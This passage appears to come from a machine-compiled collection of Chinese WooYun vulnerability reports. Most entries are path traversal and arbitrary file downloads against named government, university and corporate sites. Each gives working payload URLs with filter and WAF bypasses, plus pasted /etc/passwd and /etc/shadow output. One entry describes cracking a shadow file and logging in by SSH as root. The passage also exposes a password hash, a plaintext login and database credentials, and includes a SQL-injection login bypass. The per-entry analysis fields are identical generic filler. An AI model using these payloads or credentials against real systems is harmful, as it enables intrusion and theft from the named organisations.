**详情**: GET /ECPL/servlet/DownLoadManual?fileName=../../../../../../../../../../etc/passwd HTTP/1.1Referer: http://www.e-picclife.com:80/Cookie: JSESSIONID=YjQ1TCqFzvfGmZnKs8BL5rDBdzmM8LGnCv8GhMPnM9stwQL2J1p8!383202528Host: www.e-picclife.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/5

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019273] 住哪网任意文件下载(较严重)
**厂商**: 住哪网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接上图证明：查看下boot.ini文件：http://www.9tour.cn/index.php?m=index.showimg&p=C:\boot.ini查看下index.php的源代码：http://www.9tour.cn/index.php?m=index.showimg&p=index.php因为该站点有安全狗防护，有时候请求会出现拦截：鉴于安全狗时不时叫唤，所以暂不再进一步深入...

**POC**: 如上所述！

**绕过**: 直接利用

**修复**: 请参考wooyun同类案例！
---

---
### [wooyun-2016-0188948] 中国民航中航信安全模式绕过敏感文件读取
**厂商**: 中国民航信息集团公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网：http://**.**.**.**/tsky/漏洞站点：http://**.**.**.**/login_cn.jsp在Java端"%c0%ae"解析为"\uC0AE"，最后转义为ASCCII低字符"."。通过这个方法可以绕过目录保护读取包配置文件信息。http://**.**.**.**//js/%C0%AE%C0%AE/WEB-INF/web.xmlhttp://**.**.**.**/css/%C0%AE%C0%AE/WEB-INF/web.xmlhttp://**.**.**.**//%c0%ae/WEB-INF/web.xml

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-099919] 某cdn商服务器统一配置失误可影响腾讯360战网征途等公司
**厂商**: 某cdn | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.dnion.com/帝联cdn上海帝联信息科技股份有限公司是一家致力于专业提供互联网平台服务的高科技企业，总部位于上海，注册资金4800万。2014年12月，公司正式在新三板（全国中小企业股份转让系统）挂牌，公司证券简称：帝联科技，证券代码：831402。帝联科技依靠雄厚的资本实力、凭借敏锐的市场嗅觉和对互联网新一代业务的独特理解、利用丰富的运营经验和强大的销售力量迅速拓展互联网IDC以及CDN业务，先后在北京、广州、深圳、南通、成都、长沙等地设立了多个分公司及办事处，500多名员工，在IDC互联网数据中心、CDN内容分发网络的平台搭建、运营以及互联网增值业务拓展等方面具备丰富经验并拥有众多成功案例，综合实力居行业前列cdn服务器的1863和843端口统一存在配置失误导致root权限的任意文件读取下面收集了几十个ip证明。mac的curl升级后../转义了 下来 个小

**POC**: rtmp直播分发统计pull rtmp://hdzjhzdx1.dnionrtmp.com:1835/eventlive;pull rtmp://hdzjhzdx1.dnionrtmp.com:1835/voicelive;pull rtmp://hdgdwt4.dnionrtmp.com:1835/158show;pull rtmp://hdgdwt4.dnionrtmp.com:1835/58livev;pull rtmp://hdgdwt4.dnionrtmp.com:1835/5show;pull rtmp://hdgdwt4.dnionrtmp.com:1835/flive2;pul

**绕过**: 直接利用

**修复**: 具体成因不明
---

---
### [wooyun-2016-0167450] 万学教育某处任意文件读取
**厂商**: wanxue.cn | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #etc/passwdhttp://act.wanxue.cn/plugin.php?action=../../../../../../../../../etc/passwd%00&id=dc_mall

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 我是来找礼物的.
---

---
### [wooyun-2015-0142517] 华金证券主站任意文件下载
**厂商**: 华金证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这次说明一下思路好了：1.發現http://**.**.**.**/download/report?file=/public/images/2014cwbb.pdf，很容易就找到漏洞的点。2.定位一下pdf的档案，找file参数值定向的位置。发现http://**.**.**.**/public/images/2014cwbb.pdf可下载，所以确定是在网站根目录。3.找了一下有无php扩展名，发现有**.**.**.**/index.php/Ywfw/index07，所以尝试http://**.**.**.**/download/report?file=/index.php4.从网站结构上，不难发现是MVC架构，但从index.php上，确定是知名的php framework:5.从php framework中，可以得知几个比较重要的配置文件位置，以及如何下载原始码：config中有da

**POC**: http://**.**.**.**/download/report?file=/index.php

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-090695] 北京航空航天大学某站点任意文件下载
**厂商**: 北京航空航天大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 北京航空航天大学安全保卫处任意文件下载http://bwc.buaa.edu.cn/download.action?filePath=../../../../../../etc/shadow权限很高root:$1$rIJiG6kd$CT3TSokCDGcBTOeklEJGM1:16311:0:99999:7:::bin:*:16053:0:99999:7:::daemon:*:16053:0:99999:7:::adm:*:16053:0:99999:7:::lp:*:16053:0:99999:7:::sync:*:16053:0:99999:7:::shutdown:*:16053:0:99999:7:::halt:*:16053:0:99999:7:::mail:*:16053:0:99999:7:::news:*:16053:0:99999:7:::uucp:*:16053:0:9

**POC**: 如上

**绕过**: 直接利用

**修复**: 控制权限
---

---
### [wooyun-2013-025033] 湖北两省级政府网站基于任意文件下载成功入侵实例
**厂商**: 湖北两省级政府网站 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点一，湖北省人民政府机关事务管理局 http://www.jghq.gov.cn/漏洞点：http://www.jghq.gov.cn/download.jsp?fileName=../../../../etc/shadow站点二，湖北省知识产权局（这个局有两个domain） http://www.hbipo.gov.cn/ 以及 http://2.zbsjzd.org.cn/漏洞点： http://www.hbipo.gov.cn/download.jsp?fileName=../../../../etc/shadow 以及 http://2.zbsjzd.org.cn/download.jsp?fileName=../../../../etc/shadow

**POC**: 先破解www.jghq.gov.cn的shadow, 拿John the Ripper password cracker进行破解，1分钟不到，出来3个账号，如下图：注意最后一个“zcfg:zcfg123:0:0::/var/www/zcfg:/bin/bash” UID和GID都是0，root权限，很不错。ssh连上去，“ssh -l zcfg www.jghq.gov.cn”密码“zcfg123”。运行命令"whoami",果然root权限，并不错。如下图：然后破解www.hbipo.gov.cn以及2.zbsjzd.org.cn的shadow，发现用户名和密码一样的，仔细以观察，原来是同一

**绕过**: 直接利用

**修复**: 过滤web服务器不要运行在root权限下用户名密码过于简单ssh还是不要对外开放链接的好，即使开放，建议不要使用默认的22端口请修复时，将我添加的/var/www/jghq_utf8/test.htm和/var/www/hbipo/front/test.htm删除，谢谢！
---

---
### [wooyun-2013-026490] 申通快递目录遍历导致敏感信息泄露,内部所有联系资料,运营总裁联系方式（2）
**厂商**: 申通快递 | **年份**: 2013 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://it.sto.cn:8080/lxb/zgslxb.phphttp://it.sto.cn:8080/lxb/zzb_select.phphttp://it.sto.cn:8080/lxb/pq_select.phphttp://it.sto.cn:8080/lxb/xbm.php?dbm=高管

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0126854] 某省科技厅企业认证系统任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 河北省科技厅科技型企业认定管理系统存在文件遍历下载漏洞，可遍历下载得到关键配置文件

**POC**: 漏洞地址：http://zxqy.hebstd.gov.cn/zxqyrd/appmng/download2?downloadPath=WEB-INF&fileName=web.xmldownloadPath和fileName可控，没有限制目录和文件类型直接下载配置文件读web.xml读jdbc配置文件

**绕过**: 直接利用

**修复**: 限制目录和文件类型
---

---
### [wooyun-2015-0136563] 触控科技召唤师联盟服务端代码泄露
**厂商**: chukong-inc.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://211.151.20.241/目录遍历，多个版本目录：多个版本更新信息，显示信息为：《召唤师联盟》运营团队http://211.151.20.241/online1.4.01/android/SrvVersion.xmlhttp://211.151.20.241/OpenBeta1.3.02/android/SrvVersion.xml

**POC**: 服务端泄露，解压查看：http://211.151.20.241/server_full_2014-12-27-15937.tar.gz存在很多服务端代码和配置，未涉及到线上数据：

**绕过**: 直接利用

**修复**: 限制默认目录任意访问。
---

---
### [wooyun-2014-054125] 某政务系统通用任意文件下载 多个政府网站实例
**厂商**: 某政务系统 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /InfoManage/GetAttachment.aspx?AttachmentTimeName=../../index.aspx&AttachmentName=22.txt参数AttachmentTimeName可读取任意文件，AttachmentName只是保存文件名1.丹东市招投标监管网www.ddztb.gov.cn/InfoManage/GetAttachment.aspx?AttachmentTimeName=../../index.aspx&AttachmentName=22.txt2.丹东经济信息网www.ddcei.gov.cn/InfoManage/GetAttachment.aspx?AttachmentTimeName=../../index.aspx&AttachmentName=22.txt3.丹东市发展和改革委员会www.ddfgw.gov.cn/InfoM

**POC**: 1.丹东市招投标监管网www.ddztb.gov.cn/InfoManage/GetAttachment.aspx?AttachmentTimeName=../../index.aspx&AttachmentName=22.txt2.丹东经济信息网www.ddcei.gov.cn/InfoManage/GetAttachment.aspx?AttachmentTimeName=../../index.aspx&AttachmentName=22.txt3.丹东市发展和改革委员会www.ddfgw.gov.cn/InfoManage/GetAttachment.aspx?AttachmentTi

**绕过**: 直接利用

**修复**: 禁止目录跨越
---

---
### [wooyun-2015-0108673] 一览英才网主站任意文件下载导致源码泄露
**厂商**: job1001.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一览英才网主站某处下载未做限制导致任意文件可以下载源码漏洞地址：www.job1001.com//myNew/down.php?filename=../inc/indexCache/trade/index.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 做限制
---

---
### [wooyun-2015-0118885] 某通用教育信息发布平台任意文件下载
**厂商**: ZDSOFT | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ZDSOFT教育信息发布系统任意文件下载漏洞ZDSOFT教育信息发布系统由浙江浙大万朋软件有限公司开发浙江浙大万朋软件有限公司 http://www.zdsoft.net/典型用户http://www.zdsoft.net/moreinfo.aspx?layoutTemplateId=1201&bigClassId=266571任意文件下载链接： /cnet/admin/filemanager.down

**POC**: 测试案例：http://222.78.249.42:81/cnet/admin/filemanager.down?method=download&domesticfile=WEB-INF/web.xmlhttp://www.nj29cjzx.com/cnet/admin/filemanager.down?method=download&domesticfile=WEB-INF/web.xmlhttp://58.116.24.2/cnet/admin/filemanager.down?method=download&domesticfile=WEB-INF/web.xml其他案例：http://

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-025543] 重庆市劳动和社会保障局某网站任意文件下载
**厂商**: 重庆市劳动和社会保障局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 程序直接通过接收过来的文件名参数读取文件，见漏洞证明处源代码。

**POC**: http://jld.cq.gov.cn/wdxz/download.jsp?filename=a/../../wdxz/download.jsp

**绕过**: 直接利用

**修复**: 无.
---

---
### [wooyun-2015-0136884] Atsmart电商商网站任意文件读取（绕过腾讯云防护）
**厂商**: Atsmart | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: code地址：http://www.atsmart.net/download.php?filename=构造../../../etc/passwd尝试，发现有WAF但只检测连续三个以上../和etc/passwd敏感字，尝试绕过http://www.atsmart.net/download.php?filename=..//../../etc//passwd成功！作为一个有节操的白帽子，具体内容就不公布了。

**POC**: http://www.atsmart.net/download.php?filename=..//../../etc//passwdhttp://www.atsmart.net/download.php?filename=..//../../etc//hosts

**绕过**: 过滤绕过

**修复**: 加强过滤啊，只过滤../../../不过滤../../和../的也是少见啊！只过滤etc/passwd不过滤etc//passwd也是可以了啊！！！腾讯云安全还是不够安全啊！
---

---
### [wooyun-2011-01494] 深圳新闻网交友频道任意文件读取漏洞
**厂商**: 深圳新闻网 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://love.sznews.com/love/love/previewImageAction.do?imagUrl=/../../../../../../../../../../../etc/passwd

**POC**: 看详细说明

**绕过**: 直接利用

**修复**: 过滤，再过滤。限制，再限制。akast@ngsst.com
---

---
### [wooyun-2014-084613] 中国联通某站任意文件读取
**厂商**: 中国联通 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：http://116100.bbn.com.cnURL:http://116100.bbn.com.cn/colorring/ringcatasearch.jspPOST数据：nodename=&oper=&spindex=0&spselect=../../../WEB-INF/web.xml%3f&subindex=4444测试发现这里每一个参数都存在文件读取

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-046110] 大连万达#某监控平台存在万能密码漏洞导致信息泄露
**厂商**: 大连万达集团股份有限公司 | **年份**: 2013 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：http://58.83.219.80用户名密码进入平台  ' or 1=1 or ''='phpinfo信息数据库备份文件下载http://58.83.219.80/downloadover

**POC**: 已经证明

**绕过**: 直接利用

**修复**: 1#修复万能密码漏洞2#屏蔽敏感信息
---

---
### [wooyun-2015-0138722] 某省合肥市政府某服务中心网站任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站标题：合肥市人民政府政务服务中心漏洞链接：http://**.**.**.**/servlet/FileDownload?filepath=C:\Windows\System32\notepad.exe&dispname=1.exefilepath可以控制下载路径……下载个notepad.exe意思意思……

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个功能略强大……
---

---
### [wooyun-2015-0103282] 中国石油某财务系统任意文件下载
**厂商**: 中国石油天然气集团公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: url:http://161.207.5.195/NASApp/cpf/distribute/index.jsphttp://161.207.5.195/NASApp/cpf/DownLoadServlet?disDownDir=../../../../../etc/passwdroot:!:0:0::/:/usr/bin/kshdaemon:!:1:1::/etc:bin:!:2:2::/bin:sys:!:3:3::/usr/sys:adm:!:4:4::/var/adm:uucp:!:5:5::/usr/lib/uucp:guest:!:100:100::/home/guest:nobody:!:4294967294:4294967294::/:lpd:!:9:4294967294::/:lp:!:11:11::/var/spool/lp:/bin/falseinvscout:!:6

**POC**: O AssociatedbURL = jdbc:oracle:thin:@10.21.0.15:1521:dssDB_USERNAME = cwgsDB_PASSWORD = cwgscon

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-034522] 工信部电信研究院邮件系统配置不当导致敏感信息泄露
**厂商**: 工信部电信研究院 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于目录遍历导致把邮件日志下载下来了，里面东西还是比较多的，具体过程如下：1、输入 http://mail.catr.cn/js/随便打开一个，可以看到源码：类似的还有很多，目录基本上都可以遍历2、直接在浏览器输入http://mail.catr.cn/mail，后面没有/，会下载一个十几M的文件，解压后一百多M，是邮件的日志，这可是只有管理员才能看的东西。一哥们应聘的信：上班还得打卡，迟到了发封信，异常：太多了，自己下载看吧

**POC**: 自己下载看

**绕过**: 直接利用

**修复**: 安全配置
---

---
### [wooyun-2015-0145925] 企智通系列上网行为管理设备存在两处任意文件遍历&敏感信息泄漏(都无需登录)
**厂商**: 北京宽广智通信息技术有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://gd.189.cn/biz/introd/infor/xxaq/2011/10/18/10083.htm貌似通杀全型号设备：企智通MINI型 企智通I型 企智通II型 企智通III型 企智通IV型 企智通V型 企智通IX型(部分设备可通过“%2e”替换“.”即可绕过过滤)第一处任意文件遍历(也可目录遍历):http://url/test/downTcpdumpFile.jsp?filename=../conf/email.cfg(部分设备可通过“%2e”替换“.”即可绕过过滤)第二处任意文件遍历(也可目录遍历):http://url/report/rp_download.jsp?file=/etc/passwd&null=null敏感信息泄漏(太多了，举例一处，希望举一反三)http://url/BEAP/user_eqp_batexport.jsp

**POC**: 部分存在部分设备可通过“%2e”替换“.”即可绕过过滤可目录遍历：案例(与wooyun-2015-0139442同样的案例)：http://202.105.31.122:8888/customer.jsphttps://58.60.63.161/customer.jsphttp://116.6.87.76:8888/customer.jsphttp://219.129.23.92:8888/customer.jsphttps://14.18.144.27/customer.jsphttp://183.63.91.226:8888/customer.jsphttp://58.248.137.84

**绕过**: 过滤绕过

**修复**: 1.添加权限验证2.推送补丁不要只推送列出的案例(用户居多应一一推送)
---

---
### [wooyun-2015-094277] 某市林业信息网存在ORACLE注入,25个库泄露
**厂商**: 泉州林业局 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站泉州市林业信息网存在SQL注射的网址：http://www.qzlyj.gov.cn/leaderList.jsp?parentID=18&childID=74参数parentID库明：发现任意文件下载漏洞还未修复：http://www.qzlyj.gov.cn/download.jsp?filename=../../index.jsp

**POC**: 库明：发现任意文件下载漏洞还未修复：http://www.qzlyj.gov.cn/download.jsp?filename=../../index.jsp

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-014094] 财富中国某些分站任意文件下载
**厂商**: 财富中国 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 尝试访问两个二级域名（http://jm.3158.cn/ 和 http://tz.3158.cn/）结果都指向一个站点 （http://3158dz.cn/）那么，这个站点服务器貌似木有php环境？！导致PHP文件被下载~~！

**POC**: 我直接给出一下链接吧.....http://3158dz.cn/libs/mysql.class.phphttp://3158dz.cn/api/news.phphttp://3158dz.cn/news/search.phphttp://3158dz.cn/data/user.phphttp://3158dz.cn/news/libs/global.func.php下面以一个为例说明.....

**绕过**: 直接利用

**修复**: 你们懂....
---

---
### [wooyun-2015-0145942] 某船政交通职业学院主站任意文件下载漏洞
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/sys/attachDownload.do?down=down参数没有过滤，导致可下载任意文件**.**.**.**/sys/attachDownload.do?down=/rschttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshut

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: rt
---

---
### [wooyun-2015-0157553] 贝贝网某系统任意文件下载
**厂商**: 贝贝网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://chat.beibei.com/live/downloadserver?fid=/&act=2&isAbleZip=0&fna=../../../etc/shadow&a=1

**POC**: root权限的

**绕过**: 直接利用

**修复**: 找厂家
---

---
### [wooyun-2015-0158141] 巨人网络目录遍历/下载（泄露大量用户hash）
**厂商**: 巨人网络 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bbs.mztgame.com/data

**POC**: 还有一个php info 泄露

**绕过**: 直接利用

**修复**: 你们更专业。。。。
---

---
### [wooyun-2015-0126776] 北京首都国际机场某站任意文件读取
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://shopping.bcia.com.cn未深入~

**POC**: http://shopping.bcia.com.cn/app/eshop/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg/single/id/133

**绕过**: 直接利用

**修复**: ~
---

---
### [wooyun-2015-0154397] 小米金融Android客户端Content Provider组件任意文件读取漏洞
**厂商**: 小米科技 | **年份**: 2015 | **类型**: 默认配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 小米金融客户端实现了一个ContentProvider，默认android:exported="false"，对应于com.xiaomi.jr.FileProvider。该Provider实现了openFile()接口，但未对文件地址进行有效判断，当我们插入"../"就可以跨目录访问文件。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 内部使用的组件，应该设置android:exported="false"。需要导出的，应该严格检查外部输入。
---

---
### [wooyun-2015-089816] 江苏某市卫生局任意文件下载，绝对路径泄漏，数据库信息泄漏
**厂商**: 某市卫生局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载漏洞：http://czswsjd.com/2052/Aspx/DownLoad.ashx?name=wooyuntest.txt&path=../../web.config把path变量乱填一下就爆路径了http://czswsjd.com/2052/Aspx/DownLoad.ashx?path=hhhhhhh

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2012-08397] 某地“软考”报名网任意文件下载
**厂商**: 某地信息产业局 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://www.cqitrk.gov.cn/jsp/document_downfile.jsp?filePath=C%3A%2FProgram%20Files%2FApache%20Software%20Foundation%2FTomcat%205.5%2Fwebapps%2Fcqrk%2Fcqrk_upload%2Fiteminfo%2F&fileName=%E8%AF%81%E4%B9%A6%E7%99%BB%E8%AE%B0%E6%B3%A8%E5%86%8C%E7%94%B3%E8%AF%B7%E8%A1%A8.doc&saveName=120-2011-12-15-09-34-12-1413.doc其中文件下载路径参数filepath没有对路径进行必要的限制！另：下载路径直接暴漏了网站的物理路径！同时还发现该站点可目录浏览！

**POC**: 下载tomcat-users.xml文件：http://www.cqitrk.gov.cn/jsp/document_downfile.jsp?filePath=C:/Program%20Files/Apache%20Software%20Foundation/Tomcat%205.5/conf/&fileName=tomcat-users.xml&saveName=tomcat-users.xml下载后台管理登陆页面：http://www.cqitrk.gov.cn/jsp/document_downfile.jsp?filePath=C:/Program%20Files/Apache%20

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！同时关闭目录浏览权限！
---

---
### [wooyun-2013-037832] 联想安全漏洞# 分站任意文件下载漏洞
**厂商**: 联想 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 分站：http://legc.lenovo.com任意注册一个用户登录查看头像（上传的图片即可）链接处未对参数 filename 进行有效的控制导致任意文件下载http://legc.lenovo.com/lefactory/staticContent?type=originalAvatar&filename=../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参数应该控制在一个有效的范围之内
---

---
### [wooyun-2014-068106] FengCMS任意文件下载绕过第二发（系统特性未考虑）
**厂商**: fengcms.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 你给的测试站点，看源码你是过滤../但是你忘了window支持..\http://guf521656.h163.92hezu.org/index.php?controller=down&file=L3VwbG9hZC9cLi5cY29uZmlnLnBocA==

